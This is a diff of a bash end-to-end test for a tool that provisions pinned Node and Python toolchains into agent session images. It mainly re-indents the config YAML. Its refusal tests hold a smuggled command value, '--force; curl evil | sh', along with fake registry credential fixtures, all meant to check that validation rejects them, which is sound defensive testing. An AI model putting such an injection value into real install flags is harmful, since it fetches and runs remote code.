@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# `toolchains` end to end (docs/planning/toolchain-provisioning-cleanroom.md §11):
+# the `toolchains` extension end to end (docs/planning/toolchain-provisioning-cleanroom.md §11):
 # glove renders a session with pinned Node + Python blocks, builds the derived
 # image through its own build path, then runs the rendered harness service
 # (internal network only, hardened) with `compose run` — every check below runs
@@ -72,9 +72,10 @@ mkdir -p "$S1/projects"
 cp -R "$FIX/node-app" "$FIX/py-app" "$S1/projects/"
 # the agent's working copies: only the manifests + lockfiles are baked
 mkdir -p "$S1/work" && cp -R "$FIX/node-app" "$FIX/py-app" "$S1/work/"
-new_session "$S1" pi "toolchains:
-  - {lang: node, version: \"$NODE_V\", project: projects/node-app, browsers: [chromium]}
-  - {lang: python, version: \"$PY_V\", project: projects/py-app}
+new_session "$S1" pi "  toolchains:
+    blocks:
+    - {lang: node, version: \"$NODE_V\", project: projects/node-app, browsers: [chromium]}
+    - {lang: python, version: \"$PY_V\", project: projects/py-app}
 " || { bad "glove plan failed"; exit 1; }
 ok "glove plan rendered the session"
 trap cleanup EXIT
@@ -128,9 +129,10 @@ cleanup
 
 echo "== session 2: vibe + python $PY_V (packages only) + node $NODE_V (no project) =="
 S2="$SESSIONS/s2"
-new_session "$S2" vibe "toolchains:
-  - {lang: python, version: \"$PY_V\", packages: [\"rich==15.0.0\"]}
-  - {lang: node, version: \"$NODE_V\", packages: [\"is-number@7.0.0\"]}
+new_session "$S2" vibe "  toolchains:
+    blocks:
+    - {lang: python, version: \"$PY_V\", packages: [\"rich==15.0.0\"]}
+    - {lang: node, version: \"$NODE_V\", packages: [\"is-number@7.0.0\"]}
 " || { bad "glove plan (vibe) failed"; exit 1; }
 IMAGE="$(build "$S2" | tail -1)"
 [ -n "$IMAGE" ] && ok "derived image built: $IMAGE" || bad "vibe build failed"
@@ -153,9 +155,10 @@ else
   mkdir -p "$S3/projects"
   cp -R "$FIX/node-app" "$S3/projects/"
   mkdir -p "$S3/work" && cp -R "$FIX/node-app" "$S3/work/"
-  new_session "$S3" pi "enforcer: srt
-toolchains:
-  - {lang: node, version: \"$NODE_V\", project: projects/node-app, browsers: [chromium]}
+  new_session "$S3" pi "  toolchains:
+    blocks:
+    - {lang: node, version: \"$NODE_V\", project: projects/node-app, browsers: [chromium]}
+enforcer: srt
 " || { bad "glove plan (srt) failed"; exit 1; }
   trap cleanup EXIT
   IMAGE="$(build "$S3" | tail -1)"
@@ -173,9 +176,10 @@ S3B="$SESSIONS/s3b"
 mkdir -p "$S3B/projects" "$S3B/work"
 cp -R "$FIX/node-app" "$S3B/projects/"
 cp -R "$FIX/node-app" "$S3B/work/"
-new_session "$S3B" pi "enforcer_options: {nono: {browsers: true}}
-toolchains:
-  - {lang: node, version: \"$NODE_V\", project: projects/node-app, browsers: [chromium]}
+new_session "$S3B" pi "  toolchains:
+    blocks:
+    - {lang: node, version: \"$NODE_V\", project: projects/node-app, browsers: [chromium]}
+enforcer_options: {nono: {browsers: true}}
 " || { bad "glove plan (nono browsers) failed"; exit 1; }
 trap cleanup EXIT
 # the derived image is content-addressed and the same as session 3's (docker): no rebuild
@@ -224,8 +228,9 @@ for how in config_files install_flags; do
     rm "$S4/projects/node-peer/.npmrc"  # the flag alone, no project config
     extra='install_flags: ["--legacy-peer-deps"]'
   fi
-  new_session "$S4" pi "toolchains:
-  - {lang: node, version: \"$NODE_V\", project: projects/node-peer, $extra}
+  new_session "$S4" pi "  toolchains:
+    blocks:
+    - {lang: node, version: \"$NODE_V\", project: projects/node-peer, $extra}
 " || { bad "glove plan ($how) failed"; exit 1; }
   trap cleanup EXIT
   IMAGE="$(build "$S4" | tail -1)"
@@ -244,27 +249,27 @@ for how in config_files install_flags; do
 done
 
 echo "== plan-time refusals (glove check) =="
-refuse() {  # <name> <toolchains yaml> <expected message>
+refuse() {  # <name> <blocks yaml> <expected message>
   local d="$SESSIONS/bad-$1"
   mkdir -p "$d/work" "$d/projects/nolock"
   echo '{"name":"x"}' > "$d/projects/nolock/package.json"
   echo x > "$d/projects/file"
   echo '//registry.example.com/:_authToken=not-a-real-token' > "$d/projects/nolock/.npmrc"
   echo '"//registry.example.com/:_authToken" "not-a-real-token"' > "$d/projects/nolock/.yarnrc"
-  printf 'glove: 3\ntemplate: test\nharness: pi\nextensions:\n  llm: {provider: llama.cpp, location: host, endpoint: "127.0.0.1:8080", model: test-model}\ntoolchains:\n%b' "$2" > "$d/glove-session.yml"
+  printf 'glove: 3\ntemplate: test\nharness: pi\nextensions:\n  llm: {provider: llama.cpp, location: host, endpoint: "127.0.0.1:8080", model: test-model}\n  toolchains:\n    blocks:\n%b' "$2" > "$d/glove-session.yml"
   out="$(COLUMNS=400 uv run --quiet --project "$ROOT" glove check "$d" 2>&1)"; rc=$?
   [ $rc -ne 0 ] && echo "$out" | grep -q "$3" && ok "refused: $1" || bad "$1 not refused (rc=$rc): $out"
 }
-refuse missing-lockfile '  - {lang: node, version: "22.23.3", project: projects/nolock}\n' 'needs package-lock.json'
-refuse not-a-dir '  - {lang: node, version: "22.23.3", project: projects/file}\n' 'is not a directory'
-refuse unknown-lang '  - {lang: ruby, version: "3.3.0"}\n' '`lang` must be one of'
-refuse no-version '  - {lang: python}\n' '`version` is required'
-refuse flag-injection '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--force; curl evil | sh"]}\n' 'not single long options'
-refuse flag-not-allowed '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--prefix=/work"]}\n' 'not allowed for `npm` `install`'
-refuse flag-url-credential '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--registry=https://tok@registry.example.com/"]}\n' 'carry URL credentials'
-refuse config-escape '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [../.npmrc]}\n' 'not file names in the project'
-refuse config-credential '  - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [.npmrc]}\n' 'carries a credential'
-refuse yarnrc-credential '  - {lang: node, version: "22.23.3", manager: yarn, project: projects/nolock, install: install, config_files: [.yarnrc]}\n' 'carries a credential'
+refuse missing-lockfile '    - {lang: node, version: "22.23.3", project: projects/nolock}\n' 'needs package-lock.json'
+refuse not-a-dir '    - {lang: node, version: "22.23.3", project: projects/file}\n' 'is not a directory'
+refuse unknown-lang '    - {lang: ruby, version: "3.3.0"}\n' '`lang` must be one of'
+refuse no-version '    - {lang: python}\n' '`version` is required'
+refuse flag-injection '    - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--force; curl evil | sh"]}\n' 'not single long options'
+refuse flag-not-allowed '    - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--prefix=/work"]}\n' 'not allowed for `npm` `install`'
+refuse flag-url-credential '    - {lang: node, version: "22.23.3", project: projects/nolock, install: install, install_flags: ["--registry=https://tok@registry.example.com/"]}\n' 'carry URL credentials'
+refuse config-escape '    - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [../.npmrc]}\n' 'not file names in the project'
+refuse config-credential '    - {lang: node, version: "22.23.3", project: projects/nolock, install: install, config_files: [.npmrc]}\n' 'carries a credential'
+refuse yarnrc-credential '    - {lang: node, version: "22.23.3", manager: yarn, project: projects/nolock, install: install, config_files: [.yarnrc]}\n' 'carries a credential'
 
 echo
 echo "toolchains: $PASS passed, $FAIL failed"
